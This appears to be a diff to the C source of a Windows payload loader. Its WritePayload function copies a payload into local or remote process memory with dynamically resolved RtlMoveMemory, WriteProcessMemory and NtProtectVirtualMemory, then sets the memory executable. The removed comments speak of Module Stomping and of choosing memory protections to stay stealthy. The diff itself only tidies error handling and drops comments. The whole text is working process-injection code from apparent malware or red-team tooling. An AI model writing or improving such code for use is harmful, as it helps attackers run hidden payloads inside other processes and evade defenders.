@@ -4,8 +4,6 @@ void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char
         if (pfnRtlMoveMemory) {
             DEBUG_PRINT("WritePayload: Copying payload to local memory (RtlMoveMemory)...");
             
-            // Make sure memory is writable (needed for Module Stomping / Image memory)
-            // We use NtProtectVirtualMemory if available
             ULONG oldProt = 0;
             PVOID protAddr = pBaseAddress;
             SIZE_T protSize = payload_len;
@@ -16,13 +14,7 @@ void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char
             
             pfnRtlMoveMemory(pBaseAddress, payload, payload_len);
             
-            // Restore protection (or set to RX)?
-            // Allocator usually returns RX or RWX. 
-            // If Stomping, we want RX. If VirtualAlloc, we want RX.
-            // Let's set to PAGE_EXECUTE_READ to be safe/stealthy?
-            // But if it was RWX (VirtualAlloc), RX is better.
             if (pfnNtProtectVirtualMemory) {
-                 // Reset protAddr/Size as they might have been modified
                  protAddr = pBaseAddress; 
                  protSize = payload_len;
                  pfnNtProtectVirtualMemory(GetCurrentProcess(), &protAddr, &protSize, PAGE_EXECUTE_READ, &oldProt);
@@ -32,18 +24,14 @@ void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char
             DEBUG_PRINT("WritePayload: pfnRtlMoveMemory is NULL!");
         }
     } else {
-        #ifdef pfnWriteProcessMemory_DEFINED
         if (pfnWriteProcessMemory) {
             DEBUG_PRINT("WritePayload: Writing payload to remote process (WriteProcessMemory)...");
             SIZE_T bytesWritten = 0;
             if (!pfnWriteProcessMemory(hTargetProcess, pBaseAddress, payload, payload_len, &bytesWritten)) {
-                DEBUG_PRINT("WritePayload: WriteProcessMemory failed! Error: %d", pfnGetLastError());
+                DEBUG_PRINT("WritePayload: WriteProcessMemory failed! Error: %lu", pfnGetLastError ? pfnGetLastError() : 0);
             }
+        } else {
+            DEBUG_PRINT("WritePayload: pfnWriteProcessMemory is NULL!");
         }
-        #else
-        if (pfnWriteProcessMemory) {
-             pfnWriteProcessMemory(hTargetProcess, pBaseAddress, payload, payload_len, NULL);
-        }
-        #endif
     }
 }
